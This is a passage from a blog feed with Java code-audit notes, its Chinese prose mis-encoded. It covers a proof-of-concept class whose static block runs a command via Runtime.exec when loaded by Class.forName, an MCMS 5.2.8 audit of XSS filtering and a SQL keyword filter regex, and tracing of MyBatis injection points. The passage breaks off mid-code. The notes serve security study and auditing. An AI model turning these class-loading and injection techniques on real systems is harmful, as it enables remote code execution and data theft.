href="http://www.polaris-lab.com/index.php/archives/450/%EF%BC%89%E2%BE%A5%E9%87%8C%E9%87%8C%E8%AF%B4%E5%88%B0%EF%BC%9A">http://www.polaris-lab.com/index.php/archives/450/ï¼‰â¾¥é‡Œé‡Œè¯´åˆ°ï¼š</a><br>æ³¨æ„ï¼Œæœ‰ä¸€ç‚¹å¾ˆæœ‰è¶£ï¼Œä½¿â½¤ç”¨åŠŸèƒ½â€.classâ€æ¥åˆ›å»ºClasså¯¹è±¡çš„å¼•â½¤ç”¨æ—¶ï¼Œä¸ä¼šâ¾ƒè‡ªåŠ¨åˆå§‹åŒ–è¯¥Classå¯¹è±¡ï¼Œä½¿ç”¨forName()ä¼šè‡ªåŠ¨åˆå§‹åŒ–è¯¥Classå¯¹è±¡<br><img src="/2024/11/12/WebSecurity/codeaudit/javasec/image-6.png"><br>å›¾ä¸­æœ‰è¯´â€œæ„é€ å‡½æ•°ï¼Œåˆå§‹åŒ–æ—¶æ‰§â¾â€ï¼Œå…¶å®åœ¨ forName çš„æ—¶å€™ï¼Œæ„é€ å‡½æ•°å¹¶ä¸ä¸ä¼šæ‰§è¡Œï¼Œå³ä½¿æˆ‘ä»¬è®¾ç½® initialize&#x3D;true ã€‚<br>é‚£ä¹ˆè¿™ä¸ªåˆå§‹åŒ–ç©¶ç«ŸæŒ‡ä»€ä»€ä¹ˆå‘¢ï¼Ÿå¯ä»¥å°†è¿™ä¸ªâ€œåˆå§‹åŒ–â€ç†ç†è§£ä¸ºç±»çš„åˆå§‹åŒ–ã€‚<code>initialize</code>å‚æ•°å†³å®šæ˜¯å¦åˆå§‹åŒ–ç±»ã€‚å¯¹äºä¸€äº›ç±»çš„åŠ è½½ï¼Œå®ƒå¯èƒ½ä¼šè§¦å‘ç±»çš„é™æ€åˆå§‹åŒ–å—ã€‚ä¾‹å¦‚ï¼Œä»¥ä¸‹ç±»çš„é™æ€å—ä¼šåœ¨ç±»åŠ è½½æ—¶æ‰§è¡Œï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TrainPrint</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.printf(<span class="string">&quot;Static initial %s\n&quot;</span>, TrainPrint.class);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.printf(<span class="string">&quot;Empty block initial %s\n&quot;</span>, <span class="built_in">this</span>.getClass());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TrainPrint</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.printf(<span class="string">&quot;Initial %s\n&quot;</span>, <span class="built_in">this</span>.getClass());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŠ è½½è¿™ä¸ªç±»æ—¶ï¼Œé¦–å…ˆä¼šæ‰§è¡Œ<code>static</code>å—ï¼Œç„¶åæ˜¯å®ä¾‹å—ï¼Œæœ€åæ˜¯æ„é€ å‡½æ•°ã€‚</p><p>æ€»ç»“æ¥è¯´å°±æ˜¯:loadClass()æ–¹æ³•åªå¯¹ç±»è¿›è¡ŒåŠ è½½ï¼Œä¸ä¼šå¯¹ç±»è¿›è¡Œåˆå§‹åŒ–ã€‚Class.forName ä¼šé»˜è®¤å¯¹ç±»è¿›è¡Œåˆå§‹åŒ–ã€‚å½“å¯¹ç±»è¿›è¡Œåˆå§‹åŒ–æ—¶ï¼Œé™æ€çš„ä»£ç å—å°±ä¼šå¾—åˆ°æ‰§è¡Œï¼Œè€Œä»£ç å—å’Œæ„é€ å‡½æ•°åˆ™éœ€è¦é€‚åˆçš„ç±»å®ä¾‹åŒ–æ‰èƒ½å¾—åˆ°æ‰§è¡Œ.</p><h3 id="åå°„ç»•è¿‡æ²™ç›’çš„ä¾‹å­"><a href="#åå°„ç»•è¿‡æ²™ç›’çš„ä¾‹å­" class="headerlink" title="åå°„ç»•è¿‡æ²™ç›’çš„ä¾‹å­"></a>åå°„ç»•è¿‡æ²™ç›’çš„ä¾‹å­</h3><p>å…³äºç»•æ²™ç›’ï¼Œä¹‹å‰Code-Breaking 2018ä½œè€…å‡ºäº†äº†â¼€ä¸€é“SpELçš„é¢˜â½¬ç›®ï¼Œåˆ†äº«â¼€ä¸€ç¯‡ç¬¬ä¸‰â½…æ–¹Writeupï¼š<a href="http://rui0.cn/archives/1015">http://rui0.cn/archives/1015</a></p><p>å‡è®¾ä½ æœ‰ä¸€ä¸ªå¯ä»¥æ§åˆ¶è¾“å…¥çš„å‡½æ•°ï¼Œä¼ å…¥ä¸€ä¸ªç±»åå¹¶é€šè¿‡åå°„åŠ è½½è¿™ä¸ªç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">ref</span><span class="params">(String name)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    Class.forName(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœ<code>name</code>å‚æ•°ç”±æ”»å‡»è€…æ§åˆ¶ï¼Œä»–ä»¬å¯ä»¥åˆ©ç”¨åå°„åŠ è½½æ¶æ„ç±»å¹¶æ‰§è¡Œå…¶ä¸­çš„é™æ€åˆå§‹åŒ–å—ã€‚ä¾‹å¦‚ï¼Œä»¥ä¸‹æ¶æ„ç±»åœ¨é™æ€å—ä¸­æ‰§è¡Œ<code>Runtime.exec()</code>å‘½ä»¤æ¥åˆ›å»ºæ–‡ä»¶ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TouchFile</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;touch&quot;</span>, <span class="string">&quot;/tmp/success&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ¶æ„ç±»å¯èƒ½é€šè¿‡<code>Class.forName</code>è§¦å‘ï¼Œå¯¼è‡´åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œ<code>touch /tmp/success</code>å‘½ä»¤ï¼Œä»è€Œåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ã€‚</p><p>OPNSense freeBSD æ˜ åš </p><p><img src="/2024/11/12/WebSecurity/codeaudit/javasec/image-2.png"><br><img src="/2024/11/12/WebSecurity/codeaudit/javasec/image-3.png"><br><img src="/2024/11/12/WebSecurity/codeaudit/javasec/image-4.png"><br><img src="/2024/11/12/WebSecurity/codeaudit/javasec/image-5.png"><br>Filter<br>javasec-vuls-struts2<br>JEESNSå›ç­”å¤„å­˜åœ¨XSSæ¼æ´<br><img src="/2024/11/12/WebSecurity/codeaudit/javasec/image.png"><br><img src="/2024/11/12/WebSecurity/codeaudit/javasec/image-1.png"></p>]]></content>
      
      
      <categories>
          
          <category> Code Audit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€ä»£ç å®¡è®¡ã€‘Java MCMS æ¡†æ¶ 5.2.8</title>
      <link href="/2024/11/08/WebSecurity/codeaudit/javacodemcms/"/>
      <url>/2024/11/08/WebSecurity/codeaudit/javacodemcms/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.freebuf.com/articles/web/360757.html">https://www.freebuf.com/articles/web/360757.html</a></p><h2 id="é¡¹ç›®è¯´æ˜"><a href="#é¡¹ç›®è¯´æ˜" class="headerlink" title="é¡¹ç›®è¯´æ˜"></a>é¡¹ç›®è¯´æ˜</h2><p><a href="https://gitee.com/mingSoft/MCMS">https://gitee.com/mingSoft/MCMS</a><br>ç½‘ä¸Šçœ‹äº†ä¸‹è¿™å¥—ä»£ç çš„æ¼æ´æ¯”è¾ƒå¤šï¼Œå¯ä»¥ç”¨æ¥ç»ƒç»ƒæ‰‹</p><table><thead><tr><th align="left">æŠ€æœ¯</th><th align="left">åç§°</th><th align="left">å®˜ç½‘</th></tr></thead><tbody><tr><td align="left">Spring Framework</td><td align="left">å®¹å™¨</td><td align="left"><a href="http://projects.spring.io/spring-framework/">http://projects.spring.io/spring-framework</a></td></tr><tr><td align="left">Spring Boot</td><td align="left">MVCæ¡†æ¶</td><td align="left"><a href="https://spring.io/projects/spring-boot">https://spring.io/projects/spring-boot</a></td></tr><tr><td align="left">Apache Shiro</td><td align="left">å®‰å…¨æ¡†æ¶</td><td align="left"><a href="http://shiro.apache.org/">http://shiro.apache.org</a></td></tr><tr><td align="left">Spring session</td><td align="left">åˆ†å¸ƒå¼Sessionç®¡ç†</td><td align="left"><a href="http://projects.spring.io/spring-session">http://projects.spring.io/spring-session</a></td></tr><tr><td align="left">MyBatis</td><td align="left">ORMæ¡†æ¶</td><td align="left"><a href="http://www.mybatis.org/mybatis-3/zh/index.html">http://www.mybatis.org</a></td></tr><tr><td align="left">Freemarker</td><td align="left">è§†å›¾æ¡†æ¶</td><td align="left"><a href="http://freemarker.foofun.cn/">http://freemarker.foofun.cn</a></td></tr><tr><td align="left">PageHelper</td><td align="left">MyBatisåˆ†é¡µæ’ä»¶</td><td align="left"><a href="http://git.oschina.net/free/Mybatis_PageHelper">http://git.oschina.net/free/Mybatis_PageHelper</a></td></tr><tr><td align="left">Log4J</td><td align="left">æ—¥å¿—ç»„ä»¶</td><td align="left"><a href="http://logging.apache.org/">http://logging.apache.org</a></td></tr><tr><td align="left">Maven</td><td align="left">é¡¹ç›®æ„å»º</td><td align="left"><a href="http://maven.apache.org/">http://maven.apache.org</a></td></tr><tr><td align="left">Elasticsearch</td><td align="left">åˆ†å¸ƒå¼æœç´¢å¼•æ“</td><td align="left"><a href="https://www.elastic.co/">https://www.elastic.co</a></td></tr><tr><td align="left">Redis</td><td align="left">åˆ†å¸ƒå¼ç¼“å­˜æ•°æ®åº“</td><td align="left"><a href="https://redis.io/">https://redis.io</a></td></tr><tr><td align="left">hutool</td><td align="left">å·¥å…·ç±»</td><td align="left"><a href="http://hutool.mydoc.io/">http://hutool.mydoc.io</a></td></tr></tbody></table><table><thead><tr><th align="left">æŠ€æœ¯</th><th align="left">å¸¸è§å®‰å…¨é—®é¢˜</th><th align="left">é˜²èŒƒæªæ–½</th></tr></thead><tbody><tr><td align="left"><strong>Spring Framework</strong></td><td align="left">é…ç½®æ¼æ´ï¼ˆå¦‚æœªæ­£ç¡®é…ç½® CSRFã€CORSï¼‰ï¼Œæ•°æ®æš´éœ²é£é™©</td><td align="left">ç¡®ä¿æ­£ç¡®é…ç½® CSRF å’Œ CORSï¼Œå¯ç”¨ Spring Security è¿›è¡Œé‰´æƒï¼Œé¿å…ä¸å¿…è¦çš„ Bean æš´éœ²</td></tr><tr><td align="left"><strong>Spring Boot</strong></td><td align="left">é»˜è®¤é…ç½®å¯èƒ½æš´éœ²ç®¡ç†ç«¯ç‚¹ï¼ˆå¦‚ <code>/actuator</code>ï¼‰ï¼Œå¯èƒ½å¼•å‘ä¿¡æ¯æ³„éœ²</td><td align="left">åœ¨ <code>application.properties</code> ä¸­ç¦ç”¨ç”Ÿäº§ç¯å¢ƒçš„ç®¡ç†ç«¯ç‚¹ï¼Œé™åˆ¶è®¿é—®æƒé™</td></tr><tr><td align="left"><strong>Apache Shiro</strong></td><td align="left">é‰´æƒç»•è¿‡ï¼ˆç‰¹åˆ«æ˜¯è·¯å¾„æ‹¦æˆªä¸å½“ï¼‰ã€å¯†ç åŠ å¯†å¼ºåº¦ä¸è¶³</td><td align="left">ç¡®ä¿è·¯å¾„æ‹¦æˆªè§„åˆ™ä¸¥æ ¼ä¸”æµ‹è¯•å……åˆ†ï¼ŒåŠ å¯†é…ç½®ä¸­ä½¿ç”¨é«˜å¼ºåº¦æ•£åˆ—ç®—æ³•</td></tr><tr><td align="left"><strong>Spring Session</strong></td><td align="left">ä¼šè¯å›ºå®šæ”»å‡»ï¼ˆSession Fixationï¼‰ã€ä¼šè¯åŠ«æŒ</td><td align="left">ä½¿ç”¨ <code>https</code> ä¿æŠ¤ä¼ è¾“ï¼ŒåŠ å¯†å­˜å‚¨æ•æ„Ÿä¼šè¯ä¿¡æ¯ï¼Œå®šæœŸåˆ·æ–°ä¼šè¯</td></tr><tr><td align="left"><strong>MyBatis</strong></td><td align="left">SQL æ³¨å…¥</td><td align="left">ä½¿ç”¨ <code>#&#123;&#125;</code> è¯­æ³•ä¼ é€’å‚æ•°ï¼Œé¿å…ç›´æ¥æ‹¼æ¥ SQLï¼Œå®šæœŸæ£€æŸ¥ Mapper æ–‡ä»¶</td></tr><tr><td align="left"><strong>Freemarker</strong></td><td align="left">æ¨¡æ¿æ³¨å…¥ï¼ˆTemplate Injectionï¼‰</td><td align="left">é¿å…ä½¿ç”¨ç”¨æˆ·è¾“å…¥ç›´æ¥ä½œä¸ºæ¨¡æ¿å˜é‡ï¼Œå¼€å¯è¾“å‡ºè½¬ä¹‰</td></tr><tr><td align="left"><strong>PageHelper</strong></td><td align="left">åˆ†é¡µå‚æ•°æœªéªŒè¯ï¼Œå¯èƒ½å¯¼è‡´æ³¨å…¥</td><td align="left">æ ¡éªŒåˆ†é¡µå‚æ•°çš„åˆæ³•æ€§ï¼Œè®¾ç½®æœ€å¤§åˆ†é¡µé™åˆ¶</td></tr><tr><td align="left"><strong>Log4J</strong></td><td align="left">æ—¥å¿—æ³¨å…¥ï¼ŒJNDI æ³¨å…¥é£é™©ï¼ˆLog4Shellï¼‰</td><td align="left">é¿å…æ—¥å¿—è®°å½•ç”¨æˆ·ç›´æ¥è¾“å…¥å†…å®¹ï¼Œå‡çº§åˆ°å®‰å…¨ç‰ˆæœ¬ï¼ˆLog4j2 æœ€æ–°ç‰ˆï¼‰</td></tr><tr><td align="left"><strong>Maven</strong></td><td align="left">ä½¿ç”¨çš„ä¾èµ–åº“å¯èƒ½åŒ…å«å·²çŸ¥æ¼æ´</td><td align="left">å®šæœŸæ£€æŸ¥ä¾èµ–åº“ç‰ˆæœ¬ï¼Œä½¿ç”¨ Maven Security Scanner æ£€æµ‹</td></tr><tr><td align="left"><strong>Elasticsearch</strong></td><td align="left">é»˜è®¤é…ç½®æœªè®¤è¯ï¼Œå¯èƒ½è¢«æœªæˆæƒè®¿é—®</td><td align="left">è®¾ç½®è®¿é—®æ§åˆ¶ç­–ç•¥ï¼ŒåŠ å¯†å­˜å‚¨ï¼Œç¦ç”¨é»˜è®¤çš„ <code>_cat</code> ç­‰æ•æ„Ÿæ¥å£</td></tr><tr><td align="left"><strong>Redis</strong></td><td align="left">æœªæˆæƒè®¿é—®ï¼ŒæŒä¹…åŒ–æ•°æ®æ³„éœ²é£é™©</td><td align="left">ç¦ç”¨ä¸å¿…è¦çš„å¤–éƒ¨ç½‘ç»œè¿æ¥ï¼Œé…ç½®å¯†ç å’Œ IP ç™½åå•</td></tr><tr><td align="left"><strong>Hutool</strong></td><td align="left">å®‰å…¨æ€§ä¾èµ–å…·ä½“å·¥å…·å‡½æ•°çš„å®ç°</td><td align="left">ä½¿ç”¨æ—¶éœ€éªŒè¯ Hutool å·¥å…·ç±»çš„è¾“å…¥è¾“å‡ºæ˜¯å¦åˆæ³•ï¼Œé¿å…ç›´æ¥å¤„ç†ç”¨æˆ·è¾“å…¥</td></tr></tbody></table><h2 id="å‰å°XSS"><a href="#å‰å°XSS" class="headerlink" title="å‰å°XSS"></a>å‰å°XSS</h2><p>å…¶å®æ„Ÿè§‰ä¹Ÿä¸ç®—æ˜¯æ¼æ´ï¼Œåªæ˜¯åšç»™è‡ªå·±çœ‹çš„<br><img src="/2024/11/08/WebSecurity/codeaudit/javacodemcms/image.png"><br>ä¸»è¦åŸå› æ˜¯ä¸Šé¢åœ¨æŠ¥é”™è¿”å›æ—¶ï¼Œå°†æ¶æ„ä»£ç ä¹Ÿæ·»åŠ åœ¨äº†contentå½“ä¸­ä¸€èµ·è¿”å›<br><img src="/2024/11/08/WebSecurity/codeaudit/javacodemcms/image-1.png" alt="å¯ä»¥çœ‹åˆ°ä¸‹é¢çš„è°ƒç”¨æ ˆä¿¡æ¯"><br>è¿™é‡Œå¯ä»¥è·Ÿè¿›åˆ†æä¸‹æ˜¯æ€ä¹ˆåˆ¤æ–­çš„ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">clean</span><span class="params">(String name, String content)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> Jsoup.clean(content, <span class="string">&quot;&quot;</span>, whitelist, outputSettings);</span><br><span class="line">        result = Parser.unescapeEntities(result, <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">if</span> (content.equals(result) &amp;&amp; SqlInjectionUtil.isSqlValid(content)) &#123;</span><br><span class="line">            <span class="keyword">return</span> content;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> SpringUtil.getRequest().getRequestURI();</span><br><span class="line">            LOGGER.debug(<span class="string">&quot;æ¥å£ä¸ç¬¦åˆXSSè§„åˆ™:&#123;&#125;&quot;</span>, uri);</span><br><span class="line">            LOGGER.debug(<span class="string">&quot;å‚æ•°å:&#123;&#125; å‚æ•°å€¼:&#123;&#125;&quot;</span>, name, content);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BusinessException</span>(<span class="string">&quot;å‚æ•°å¼‚å¸¸:&quot;</span> + content);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>åœ¨ä¸Šé¢çš„ Jsoup.clean ä¸­å°±å·²ç»æ¸…é™¤äº†ï¼ŒJsoup.clean æ˜¯ Jsoup åº“çš„ä¸€éƒ¨åˆ†ï¼ŒJsoup æ˜¯ä¸€ä¸ªå¼€æºçš„ Java åº“ï¼Œä¸“é—¨ç”¨äºè§£æã€æ¸…ç†å’Œæ“ä½œ HTMLã€‚Jsoup å¯ä»¥ä» HTML ä¸­ç§»é™¤ä¸å®‰å…¨çš„å†…å®¹ï¼Œå› æ­¤å¸¸ç”¨äºé˜²æ­¢ XSS æ”»å‡»ã€‚<br><a href="https://blog.csdn.net/qq_33915826/article/details/104484336">ä½¿ç”¨Jsoup.cleanæ¶ˆé™¤ä¸å—ä¿¡ä»»çš„HTML (é˜²æ­¢XSSæ”»å‡»)</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">clean</span><span class="params">(String bodyHtml, String baseUri, Whitelist whitelist, Document.OutputSettings outputSettings)</span> &#123;</span><br><span class="line">        <span class="type">Document</span> <span class="variable">dirty</span> <span class="operator">=</span> parseBodyFragment(bodyHtml, baseUri);</span><br><span class="line">        <span class="type">Cleaner</span> <span class="variable">cleaner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cleaner</span>(whitelist);</span><br><span class="line">        <span class="type">Document</span> <span class="variable">clean</span> <span class="operator">=</span> cleaner.clean(dirty);</span><br><span class="line">        clean.outputSettings(outputSettings);</span><br><span class="line">        <span class="keyword">return</span> clean.body().html();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p> bodyHtml å­—ç¬¦ä¸²è§£æä¸ºä¸€ä¸ª Document å¯¹è±¡ï¼Œç§°ä¸º dirtyï¼ˆâ€œæœªæ¸…ç†â€æ–‡æ¡£ï¼‰ã€‚<br><img src="/2024/11/08/WebSecurity/codeaudit/javacodemcms/image-2.png"><br><img src="/2024/11/08/WebSecurity/codeaudit/javacodemcms/image-3.png" alt="è¿™é‡Œcleanä¹‹åå°±å·²ç»ä¸åŒ…å«æ¶æ„ä»£ç äº†"><br>æ³¨æ„åˆ°å‰é¢çš„ä»£ç ä¸­è¿˜æœ‰å¯¹sqlä»£ç çš„è¿‡æ»¤ï¼Œè·Ÿè¿›å»çœ‹åˆ°äº†è§„åˆ™å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Pattern</span> <span class="variable">sqlPattern</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;(?:&#x27;)|(?:--)|(/\\*(?:.|[\\n\\r])*?\\*/)|(\\b(select|update|and|or|delete|insert|trancate|char|substr|ascii|declare|chr|mid|exec|count|master|into|drop|execute)\\b)&quot;</span>, <span class="number">2</span>);</span><br></pre></td></tr></table></figure><h2 id="SQLæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a>SQLæ³¨å…¥</h2><p>å‰é¢å·²ç»çŸ¥é“äº†MCMSä½¿ç”¨mybaitsä½œä¸ºæŒä¹…å±‚æ¡†æ¶ï¼Œå¯ä»¥åˆ†æç›¸åº”çš„æ˜ å°„æ–‡ä»¶ï¼Œåœ¨å…¶ä¸­æŸ¥æ‰¾ä½¿ç”¨<code>$</code>æ‹¼æ¥çš„å‚æ•°ã€‚é™¤æ­¤ä¹‹å¤–è¿˜æœ‰ç§æ¼æ´æ€è·¯ï¼Œ<code>&lt;include&gt;&lt;/include&gt;</code>æ ‡ç­¾ï¼Œä¼šå°†ä¸€æ®µå¤ç”¨çš„SQLä»£ç æ‹¼æ¥å…¥å½“å‰è¯­å¥ä¸­ã€‚</p><h3 id="æŸ¥è¯¢åˆ†æ"><a href="#æŸ¥è¯¢åˆ†æ" class="headerlink" title="$ æŸ¥è¯¢åˆ†æ"></a>$ æŸ¥è¯¢åˆ†æ</h3><p>åœ¨<code>IContentDao.xml</code>ä¸­æ‰¾åˆ°äº†ç”¨åˆ°äº†ï¼Œè¿™ä¸ªå…ˆæš‚æ—¶æ”¾ç€</p><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="&lt;include&gt;&lt;/include&gt;åˆ†æ"></a><code>&lt;include&gt;&lt;/include&gt;</code>åˆ†æ</h3><p>ä¸‰ä¸ªxmlæ–‡ä»¶ä¸­éƒ½åŒ…å«æœ‰ä¸‹é¢çš„è¿™ä¸ªï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">include</span> <span class="attr">refid</span>=<span class="string">&quot;net.mingsoft.base.dao.IBaseDao.sqlWhere&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿›å…¥åˆ°è¿™ä¸ªç±»é‡Œé¢çœ‹çœ‹åˆ°åº•æ˜¯ä»€ä¹ˆ<br><img src="/2024/11/08/WebSecurity/codeaudit/javacodemcms/image-4.png"><br>å¯ä»¥çœ‹åˆ°å…¶ä¸­æœ‰å¤§é‡çš„$ï¼Œä¸»è¦æ˜¯ç”¨åˆ°äº†<code>$&#123;item.field&#125;</code>ï¼Œåˆ†æå¾—åˆ°è¿™ä¸ªæ˜¯æ¥è‡ªäº sqlWhereList ï¼Œå…¶ä¸­çš„fieldå˜é‡æ˜¯å¯èƒ½å­˜åœ¨çš„æ³¨å…¥ç‚¹ã€‚<br>æ¥ä¸‹æ¥çœ‹çœ‹è¿™ä¸ªæ˜¯å¦å¯æ§ï¼Œè¿”å›å»æŸ¥çœ‹æ–¹æ³•è°ƒç”¨çš„ç‚¹ï¼Œåœ¨ICategoryDao.xmlï¼Œæ‰¾select id&#x3D;â€queryâ€å¯¹åº”çš„æ¥å£ï¼Œæ²¡æœ‰æ‰¾åˆ°ï¼Œè¿›å…¥åˆ°å…¶åŸºç±»ä¸­æŸ¥æ‰¾ï¼Œæ‰¾åˆ°äº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IBaseDao</span>&lt;E&gt; <span class="keyword">extends</span> <span class="title class_">BaseMapper</span>&lt;E&gt; &#123;</span><br><span class="line">...</span><br><span class="line">    List&lt;E&gt; <span class="title function_">query</span><span class="params">(BaseEntity entity)</span>;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿›ä¸€æ­¥æ‰¾queryçš„å®ç°ç±»ï¼Œæœ‰ä¸‰ä¸ªï¼Œä½†åªæœ‰ä¸€ä¸ªæ¥å—å‚æ•°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// net/mingsoft/base/biz/impl/BaseBizImpl.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">BaseBizImpl</span>&lt;M <span class="keyword">extends</span> <span class="title class_">BaseMapper</span>&lt;T&gt;,T&gt; <span class="keyword">extends</span> <span class="title class_">ServiceImpl</span>&lt;M,T&gt; <span class="keyword">implements</span> <span class="title class_">IBaseBiz</span>&lt;T&gt; &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> List&lt;T&gt; <span class="title function_">query</span><span class="params">(BaseEntity entity)</span> &#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line"><span class="keyword">return</span> getDao().query(entity);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å†æ‰¾æ‰¾çœ‹å“ªé‡Œç”¨äº†<br><img src="/2024/11/08/WebSecurity/codeaudit/javacodemcms/image-5.png"><br>è·Ÿè¿›<code>net/mingsoft/cms/action/CategoryAction.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Api(tags=&#123;&quot;åç«¯-å†…å®¹æ¨¡å—æ¥å£&quot;&#125;)</span></span><br><span class="line"><span class="meta">@Controller(&quot;cmsCategoryAction&quot;)</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/$&#123;ms.manager.path&#125;/cms/category&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CategoryAction</span> <span class="keyword">extends</span> <span class="title class_">BaseAction</span> &#123;</span><br><span class="line">    ......</span><br><span class="line"><span class="meta">@RequestMapping(value=&quot;/list&quot;,method = &#123;RequestMethod.GET, RequestMethod.POST&#125;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="meta">@RequiresPermissions(&quot;cms:category:view&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ResultData <span class="title function_">list</span><span class="params">(<span class="meta">@ModelAttribute</span> <span class="meta">@ApiIgnore</span> CategoryEntity category)</span> &#123;</span><br><span class="line">BasicUtil.startPage();</span><br><span class="line"><span class="type">List</span> <span class="variable">categoryList</span> <span class="operator">=</span> categoryBiz.query(category);</span><br><span class="line"><span class="keyword">return</span> ResultData.build().success(<span 